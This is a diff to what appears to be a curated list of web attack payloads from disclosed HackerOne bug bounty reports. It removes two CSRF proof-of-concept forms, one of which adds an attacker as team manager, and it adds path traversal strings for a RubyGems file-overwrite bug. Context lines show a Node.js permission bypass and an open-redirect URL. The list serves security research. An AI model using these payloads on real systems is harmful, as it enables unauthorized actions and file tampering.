@@ -355,25 +355,6 @@ $ node --experimental-permission \
 
 — [Path traversal through path stored in Uint8Array in Node.js 20](https://hackerone.com/reports/2256167) · Internet Bug Bounty · [tniessen](https://hackerone.com/tniessen) · $3,495.0
 
-### `119ac9d7`
-
-```
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <meta name="referrer" content="none">
-    <meta name="referrer" content="no-referrer">
-</head>
-<body>
-      <form action="https://target.com/api/graphql/" id="csrf-form" method="GET">
-        <input name="query" value="mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $
-```
-
-— [CSRF on /api/graphql allows executing mutations through GET requests](https://hackerone.com/reports/1122408) · GitLab · [az3z3l](https://hackerone.com/az3z3l) · $3,370.0
-
 ### `e21e9381`
 
 ```
@@ -599,24 +580,6 @@ $ node --experimental-permission --allow-fs-read=/tmp/ -p "path.resolve = (s) =>
 ```
 
 — [Permission model improperly protects against path traversal in Node.js 20](https://hackerone.com/reports/2225660) · Internet Bug Bounty · [tniessen](https://hackerone.com/tniessen) · $2,330.0
-
-### `6b9a7472`
-
-```
-<form method="POST" action="https://target.com/danlec-test/team_members"
-     target="_blank">
-  <input type="text" name="authenticity_token" 
-     value="authenticity_token from the POST to this page">
-  <input type="text" name="invitations_team_member[email]" 
-     value="attacker@gmail.com">
-  <input type="hidden" name="team_member[add_as_manager]" value="1">
-  <input type="hidden" name="utf8" value="✓">
-  <input type="hidden" name="commit" value="Send invite">
-  <input type="submit">
-</fo
-```
-
-— [CSP Bypass: Click handler for links with data-method="post" can cause authenticity_token to be sent off domain](https://hackerone.com/reports/47472) · HackerOne · [danlec](https://hackerone.com/danlec) · $2,000.0
 
 ### `6cd52ba3`
 
@@ -1120,6 +1083,24 @@ https://target.com/web/sign-inhttps://target.com/javascript:alert(1
 
 ```
 ../../../../../any/where
+```
+
+**Parameter:** `name`
+— [Installing a crafted gem package may create or overwrite files](https://hackerone.com/reports/243156) · RubyGems · [mame](https://hackerone.com/mame) · $1,000.0
+
+### `c79009b1`
+
+```
+../../../../../../../../../../tmp/malicious
+```
+
+**Parameter:** `name`
+— [Installing a crafted gem package may create or overwrite files](https://hackerone.com/reports/243156) · RubyGems · [mame](https://hackerone.com/mame) · $1,000.0
+
+### `2be3302c`
+
+```
+../gems/rack
 ```
 
 **Parameter:** `name`
